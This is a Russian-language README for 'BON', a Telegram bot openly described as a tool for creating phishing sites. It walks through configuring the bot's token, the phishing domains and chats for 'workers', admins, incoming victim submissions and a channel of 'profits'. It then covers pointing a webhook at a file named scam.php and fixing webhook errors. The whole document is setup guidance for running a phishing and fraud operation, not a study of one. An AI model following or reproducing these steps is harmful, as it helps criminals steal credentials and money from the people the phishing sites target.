# BON
Бот для создания фишинг сайтов.

____
1) Настроить файл `_config.php`
 **botToken** - токен бота от @BotFather
 **botLogin** - логин бота без @
 **prjName** - имя проекта 
 **linkChat** - ссылка на чат воркеров
 **linkPays** - ссылка на канал с профитами
 **chatGroup** - ID чата воркеров
 **chatAdmin** - ID чата админов
 **chatAlerts** - ID чата куда будут приходить заявки
 **chatProfits** - ID канала профитов
 **allDomains** - домены дял фишинга 
 
2) Кинуть webhook на файлик `scam.php`
 ``` https://api.telegram.org/botTOKEN/setWebhook?url=DOMAIN/scam.php ```
 **TOKEN** - токен бота
 **DOMAIN** - домен бота
 На домене бота обязательно дожен быть SSL сертификат
 
 **Ошибки при установке webhook**
 1) `{"ok":false,"error_code":401,"description":"Unauthorized"}` - **Неверный токен бота**
 2) `{"ok":false,"error_code":400,"description":"Bad Request: invalid webhook URL specified"}` - **Неверный URL бота**
 3) `{"ok":false,"error_code":400,"description":"Bad Request: bad webhook: Failed to resolve host: No address associated with hostname"}` - ****
 
 
 
 
